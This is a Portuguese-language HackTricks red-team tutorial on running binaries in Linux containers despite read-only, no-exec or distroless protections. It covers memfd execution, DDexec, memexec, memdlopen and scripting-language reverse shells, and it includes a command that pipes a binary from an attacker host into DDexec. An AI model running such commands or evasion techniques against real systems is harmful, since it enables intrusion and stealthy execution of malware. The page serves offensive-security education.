# Bypass FS protections: read-only / no-exec / Distroless

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se você está interessado em **carreira de hacking** e hackear o inhackeável - **estamos contratando!** (_fluência em polonês escrita e falada é necessária_).

{% embed url="https://www.stmcyber.com/careers" %}

## Vídeos

Nos vídeos a seguir, você pode encontrar as técnicas mencionadas nesta página explicadas com mais profundidade:

* [**DEF CON 31 - Explorando Manipulação de Memória Linux para Stealth e Evasão**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Intrusões furtivas com DDexec-ng & dlopen() em memória - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## cenário read-only / no-exec

É cada vez mais comum encontrar máquinas linux montadas com **proteção de sistema de arquivos somente leitura (ro)**, especialmente em contêineres. Isso ocorre porque executar um contêiner com sistema de arquivos ro é tão fácil quanto definir **`readOnlyRootFilesystem: true`** no `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

No entanto, mesmo que o sistema de arquivos esteja montado como ro, **`/dev/shm`** ainda será gravável, então é falso que não podemos escrever nada no disco. No entanto, esta pasta será **montada com proteção no-exec**, então se você baixar um binário aqui você **não poderá executá-lo**.

{% hint style="warning" %}
Do ponto de vista de uma equipe vermelha, isso torna **complicado baixar e executar** binários que não estão no sistema (como backdoors ou enumeradores como `kubectl`).
{% endhint %}

## Bypass mais fácil: Scripts

Note que mencionei binários, você pode **executar qualquer script** desde que o interpretador esteja dentro da máquina, como um **script shell** se `sh` estiver presente ou um **script python** se `python` estiver instalado.

No entanto, isso não é suficiente para executar seu backdoor binário ou outras ferramentas binárias que você possa precisar rodar.

## Bypasses de Memória

Se você quiser executar um binário, mas o sistema de arquivos não permitir isso, a melhor maneira de fazê-lo é **executá-lo da memória**, já que as **proteções não se aplicam lá**.

### Bypass de FD + syscall exec

Se você tiver alguns poderosos motores de script dentro da máquina, como **Python**, **Perl** ou **Ruby**, você poderia baixar o binário para executar da memória, armazená-lo em um descritor de arquivo de memória (`create_memfd` syscall), que não será protegido por essas proteções e então chamar uma **syscall `exec`** indicando o **fd como o arquivo a ser executado**.

Para isso, você pode facilmente usar o projeto [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Você pode passar um binário e ele gerará um script na linguagem indicada com o **binário comprimido e codificado em b64** com as instruções para **decodificá-lo e descomprimí-lo** em um **fd** criado chamando a syscall `create_memfd` e uma chamada para a syscall **exec** para executá-lo.

{% hint style="warning" %}
Isso não funciona em outras linguagens de script como PHP ou Node porque elas não têm nenhuma **maneira padrão de chamar syscalls brutas** de um script, então não é possível chamar `create_memfd` para criar o **fd de memória** para armazenar o binário.

Além disso, criar um **fd regular** com um arquivo em `/dev/shm` não funcionará, pois você não poderá executá-lo porque a **proteção no-exec** se aplicará.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) é uma técnica que permite que você **modifique a memória do seu próprio processo** sobrescrevendo seu **`/proc/self/mem`**.

Portanto, **controlando o código de montagem** que está sendo executado pelo processo, você pode escrever um **shellcode** e "mutar" o processo para **executar qualquer código arbitrário**.

{% hint style="success" %}
**DDexec / EverythingExec** permitirá que você carregue e **execute** seu próprio **shellcode** ou **qualquer binário** da **memória**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Para mais informações sobre esta técnica, consulte o Github ou:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) é o próximo passo natural do DDexec. É um **shellcode demonizado do DDexec**, então toda vez que você quiser **executar um binário diferente**, não precisa relançar o DDexec, você pode apenas executar o shellcode do memexec via a técnica DDexec e então **comunicar-se com este daemon para passar novos binários para carregar e executar**.

Você pode encontrar um exemplo de como usar **memexec para executar binários de um shell reverso PHP** em [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Com um propósito semelhante ao DDexec, a técnica [**memdlopen**](https://github.com/arget13/memdlopen) permite uma **maneira mais fácil de carregar binários** na memória para depois executá-los. Isso pode até permitir carregar binários com dependências.

## Bypass Distroless

### O que é distroless

Contêineres distroless contêm apenas os **componentes mínimos necessários para executar um aplicativo ou serviço específico**, como bibliotecas e dependências de tempo de execução, mas excluem componentes maiores como um gerenciador de pacotes, shell ou utilitários de sistema.

O objetivo dos contêineres distroless é **reduzir a superfície de ataque dos contêineres eliminando componentes desnecessários** e minimizando o número de vulnerabilidades que podem ser exploradas.

### Reverse Shell

Em um contêiner distroless, você pode **não encontrar nem `sh` nem `bash`** para obter um shell regular. Você também não encontrará binários como `ls`, `whoami`, `id`... tudo que você normalmente executa em um sistema.

{% hint style="warning" %}
Portanto, você **não** poderá obter um **reverse shell** ou **enumerar** o sistema como costuma fazer.
{% endhint %}

No entanto, se o contêiner comprometido estiver executando, por exemplo, um flask web, então o python está instalado, e portanto você pode obter um **Python reverse shell**. Se estiver executando node, você pode obter um shell reverso Node, e o mesmo com praticamente qualquer **linguagem de script**.

{% hint style="success" %}
Usando a linguagem de script, você poderia **enumerar o sistema** usando as capacidades da linguagem.
{% endhint %}

Se não houver proteções **`read-only/no-exec`**, você poderia abusar do seu reverse shell para **escrever no sistema de arquivos seus binários** e **executá-los**.

{% hint style="success" %}
No entanto, neste tipo de contêiner, essas proteções geralmente existirão, mas você poderia usar as **técnicas de execução em memória anteriores para contorná-las**.
{% endhint %}

Você pode encontrar **exemplos** de como **explorar algumas vulnerabilidades RCE** para obter shells reversos de linguagens de script e executar binários da memória em [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Se você está interessado em uma **carreira em hacking** e hackear o inhackeável - **estamos contratando!** (_fluência em polonês escrita e falada é necessária_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}
